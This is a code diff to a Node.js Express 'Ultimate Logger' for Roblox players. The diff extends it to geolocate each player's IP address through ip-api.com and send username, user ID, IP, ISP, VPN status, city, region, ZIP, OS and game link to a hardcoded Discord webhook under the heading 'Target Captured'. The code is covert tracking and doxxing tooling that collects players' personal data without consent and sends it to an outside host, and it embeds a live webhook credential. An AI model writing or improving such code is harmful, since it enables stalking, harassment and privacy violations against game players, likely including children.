@@ -1,71 +1,57 @@
 const express = require('express');
-const https = require('https');
+const axios = require('axios');
 const app = express();
 
-// YOUR WEBHOOK
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';
 
-function postToDiscord(playerData) {
-    const payload = JSON.stringify({
-        embeds: [{
-            title: '🕵️ Player Logged',
-            fields: [
-                { name: '👤 Name', value: playerData.playerName || 'Unknown', inline: true },
-                { name: '🆔 ID', value: playerData.userId || 'Unknown', inline: true },
-                { name: '🌐 IP', value: `\`${playerData.ipAddress}\``, inline: true },
-                { name: '📍 Place', value: playerData.placeId || 'N/A', inline: true }
-            ],
-            color: 16711680,
-            timestamp: new Date().toISOString()
-        }]
-    });
-    
-    const req = https.request(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(payload)
-        }
-    }, (res) => {
-        console.log('✅ Discord OK:', res.statusCode);
-    });
-    
-    req.on('error', (e) => {
-        console.log('⚠️ Discord failed:', e.message);
-    });
-    
-    req.write(payload);
-    req.end();
+const cache = new Map();
+
+async function getGeo(ip) {
+    try {
+        const res = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}?fields=status,message,country,regionName,city,zip,isp,org,mobile,proxy,hosting`);
+        return res.data;
+    } catch { return { status: 'fail' }; }
 }
 
-app.get('/log', (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || 
-               req.headers['x-real-ip'] || 
-               req.ip || 'Unknown';
-    
-    const data = {
-        playerName: req.query.playerName || 'Unknown',
-        userId: req.query.userId || 'Unknown',
-        placeId: req.query.placeId || 'Unknown',
-        ipAddress: ip.split(',')[0]
-    };
-    
-    console.log(`🎮 ${data.playerName} | ${data.ipAddress}`);
-    
-    // SAFE DISCORD SEND
-    try {
-        postToDiscord(data);
-    } catch (e) {
-        console.log('Discord error:', e.message);
+app.get('/log', async (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
+    const { userId, name, display, placeId, job, os } = req.query;
+
+    if (cache.has(userId) && (Date.now() - cache.get(userId) < 300000)) {
+        return res.json({ status: "skipped", reason: "rate_limited" });
     }
-    
-    res.json({ ok: true, ip: data.ipAddress });
+    cache.set(userId, Date.now());
+
+    const geo = await getGeo(ip);
+    const avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
+
+    const embed = {
+        username: "Roblox Intelligence System",
+        avatar_url: "https://i.imgur.com/W9vS0Zp.png",
+        embeds: [{
+            title: "🎯 Target Captured: " + (name || "Unknown"),
+            url: `https://www.roblox.com/users/${userId}/profile`,
+            color: geo.proxy || geo.hosting ? 16711680 : 3447003,
+            thumbnail: { url: avatar },
+            fields: [
+                { name: "👤 Identity", value: `**User:** ${name}\n**Display:** ${display}\n**ID:** \`${userId}\``, inline: true },
+                { name: "🌐 Network", value: `**IP:** \`${ip}\`\n**ISP:** ${geo.isp || "N/A"}\n**VPN/Proxy:** ${geo.proxy ? "⚠️ YES" : "✅ NO"}`, inline: true },
+                { name: "📍 Location", value: `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip || "???"})`, inline: false },
+                { name: "💻 Device Info", value: `**OS:** ${os || "Unknown"}\n**Job:** \`${job ? job.slice(-10) : "N/A"}\``, inline: true },
+                { name: "🎮 Game", value: `[Join Game](https://www.roblox.com/games/${placeId})`, inline: true }
+            ],
+            footer: { text: `Captured at ${new Date().toLocaleString()}` }
+        }]
+    };
+
+    try {
+        await axios.post(WEBHOOK_URL, embed);
+        console.log(`✅ Logged: ${name} [${ip}]`);
+    } catch (e) {
+        console.error("❌ Webhook Error");
+    }
+
+    res.json({ success: true, message: "Data synchronized." });
 });
 
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', time: new Date().toISOString() });
-});
-
-app.listen(process.env.PORT || 3000, () => {
-    console.log('🚀 Logger started');
-});
+app.listen(process.env.PORT || 3000, () => console.log('🚀 Ultimate Logger Online'));
